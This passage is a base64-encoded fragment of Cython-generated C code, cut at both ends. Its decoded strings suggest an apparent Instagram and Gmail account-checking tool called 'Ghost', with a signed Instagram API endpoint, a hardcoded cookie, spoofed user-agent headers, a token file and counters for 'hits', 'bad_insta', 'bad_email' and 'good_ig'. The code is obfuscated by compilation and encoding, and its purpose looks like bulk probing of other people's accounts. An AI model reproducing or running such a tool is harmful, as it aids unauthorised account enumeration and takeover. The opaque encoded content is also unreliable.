fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWdfc2lnX2tleV92ZXJzaW9uLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaWdfc2lnX2tleV92ZXJzaW9uKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2lnbmVkX2JvZHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaWduZWRfYm9keSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nvb2tpZV92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbnRlbnRfdHlwZV9oZWFkZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQ29udGVudF9UeXBlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llX2hlYWRlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfYWdlbnRfaGVhZGVyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1VzZXJfQWdlbnQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kZWZhdWx0X3VzZXJfYWdlbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTW96aWxsYV81XzBfV2luZG93c19OVF8xMF8wX1dpbjYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29nbGVfYWNjb3VudHNfdXJsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29nbGVfYWNjb3VudHNfZG9tYWluLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY291bnRzX2dvb2dsZV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcnJlcl9oZWFkZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3JpZ2luX2hlYWRlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbikgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eV9oZWFkZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdXRob3JpdHkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb250ZW50X3R5cGVfZm9ybSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbnRlbnRfdHlwZV9mb3JtX2FsdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG9rZW5fZmlsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV90bF90eHQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdHB5LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dtYWlsX2NvbV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZiwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwMm0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNTMsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwM20pIDwgKDApKSBfX1BZWF9FUlIoMCwgNTQsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwNG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwNW0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwNm0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNTcsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIwN20pIDwgKDApKSBfX1BZWF9FUlIoMCwgNTgsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfNDhtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU5LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9XLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfMTVtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYwLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfMzltKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfMjAzbSkgPCAoMCkpIF9fUFlYX0VSUigwLCA2MiwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR04sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNV80Nm0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNjMsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dyeSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzI0OG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNjQsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3llbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIyNm0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNjUsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3llbDEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNV8yMjdtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDY2LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV95ZWwyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfMjI4bSkgPCAoMCkpIF9fUFlYX0VSUigwLCA2NywgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeWVsMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzIyOW0pIDwgKDApKSBfX1BZWF9FUlIoMCwgNjgsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3llbDQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNV8yMzBtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV95ZWw1LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzVfMjMxbSkgPCAoMCkpIF9fUFlYX0VSUigwLCA3MCwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG90YWxfaGl0cywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNzIsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfaW5zdGEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDc0LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfZW1haWwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDc1LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kX2lnLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpCgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA3OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TZXNzaW9uKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Nlc3Npb24sIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA3OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfNSA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjJ9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4MSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfNSA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3doaXRlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxhY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CgogIAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDUgOiAwKV0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1R9OwogICAgX19weXhfdF83ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcyg1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb250LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2ssIF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb2xvcnMsIF9fcHl4X3RfNCwgX19weXhfdF83LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FsaWduLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2VudGVyLCBfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFja2dyb3VuZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dyZWVuLCBfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzKzIsIDMpIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BhY2UsIFB5X1RydWUsIF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrMiwgNCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpCiAgICBfX3B5eF90XzMgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4MiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2dvLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICBfX3B5eF90XzcgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvZ28pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF90XzR9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF83ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF80ID0gX19weXhfY